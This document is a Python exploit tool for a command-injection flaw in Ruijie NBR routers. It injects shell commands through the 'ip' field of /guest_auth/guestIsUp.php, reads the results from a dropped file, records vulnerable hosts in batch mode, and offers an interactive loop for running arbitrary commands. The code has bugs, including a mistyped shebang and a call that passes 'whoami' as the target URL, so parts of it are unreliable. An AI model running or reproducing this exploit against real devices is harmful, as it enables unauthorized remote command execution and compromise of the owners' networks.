#!/user/bin/env python3
# -*- coding: utf-8 -*-
import requests
import sys
import urllib3
import threadpool
from urllib import parse
import random
from pub.com.reqset import ReqSet
from rich.prompt import Prompt
from pub.com.outprint import OutPrintInfoSuc
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
url_list = []


class RuiJie_NBR_Rce_Scan:

    # poc
    def check_vuln(self, url):
        url = parse.urlparse(url)
        url1 = url.scheme + '://' + url.netloc
        vuln_url = url.scheme + '://' + url.netloc + '/guest_auth/guestIsUp.php'
        headers = {
            'User-Agent': self.headers["User-Agent"],
            "Content-Type": "application/x-www-form-urlencoded",
        }
        data = "mac=1&ip=127.0.0.1|whoami>tmp5.txt"
        try:
            res = requests.post(vuln_url, headers=headers, data=data, timeout=15, verify=self.verify,proxies=self.proxy)
            if res.status_code == 200:
                res2 = requests.get(url1 + '/guest_auth/tmp5.txt', headers=headers, timeout=15, verify=self.verify,proxies=self.proxy)
                if res2.status_code == 200 and len(res2.text) < 100:
                    if not self.batch:
                        print("\033[32m[+]%s id:%s\033[0m" % (url1, res2.text), end='')
                    else:
                        OutPrintInfoSuc("RuiJie",f"存在漏洞 {url1}")
                        with open("./result/ruijie_nbr_rce.txt","a") as w:
                            w.write(f"{url1}\n")
                    return 1
            else:
                if not self.batch:
                # pass
                    print("\033[31m[-]%s is not vuln\033[0m" % url1)

        except Exception as e:
            # pass
            if not self.batch:
                print("\033[31m[-]%s is timeout\033[0m" % url1)

    # cmdshell
    def cmdshell(self, url):
        if self.check_vuln(url) == 1:
            url = parse.urlparse(url)
            url1 = url.scheme + '://' + url.netloc
            headers = {
                'User-Agent': self.headers["User-Agent"],
                "Content-Type": "application/x-www-form-urlencoded",
            }
            while 1:
                cmd = input("\033[35mCmd: \033[0m")
                if cmd == "exit":
                    sys.exit(0)
                else:
                    data = "mac=1&ip=127.0.0.1|" + cmd + ">tmp5.txt"
                    try:
                        res = requests.post(url1 + '/guest_auth/guestIsUp.php', headers=headers, data=data, timeout=15,
                                            verify=self.verify,proxies=self.proxy)
                        if res.status_code == 200:
                            res2 = requests.get(url1 + '/guest_auth/tmp5.txt', headers=headers, timeout=15,
                                                verify=self.verify,proxies=self.proxy)
                            if res2.status_code == 200:
                                print("\033[32m%s\033[0m" % res2.text, end='')
                        else:

                            print("\033[31m[-]%s request flase!\033[0m" % url1)

                    except Exception as e:

                        print("\033[31m[-]%s is timeout!\033[0m" % url1)


    def main(self,target):
        self.batch = target["batch_work"]
        url = target["url"].strip('/ ')
        self.verify = target["ssl"]
        header = target["header"]
        proxy = target["proxy"]
        self.headers, self.proxy = ReqSet(header=header, proxy=proxy, bwork=self.batch)
        show = r'''

        ______ _____   _   _ ____________  ______  _____  _____ 
        | ___ \  __ \ | \ | || ___ \ ___ \ | ___ \/  __ \|  ___|
        | |_/ / |  \/ |  \| || |_/ / |_/ / | |_/ /| /  \/| |__  
        |    /| | __  | . ` || ___ \    /  |    / | |    |  __| 
        | |\ \| |_\ \ | |\  || |_/ / |\ \  | |\ \ | \__/\| |___ 
        \_| \_|\____/ \_| \_/\____/\_| \_| \_| \_| \____/\____/ 
                  ______               ______                   
                 |______|             |______|                  

                                        RG_NBR_RCE_exp By m2
        '''
        if not self.batch:
            print(show + '\n')


            print('[*]任务开始...')
        if self.check_vuln(url):
            if not self.batch:
                choose = Prompt.ask("[b yellow]是否进行漏洞利用([b red]y/n[/b red])")
                if choose == "y":
                    self.cmdshell("whoami")
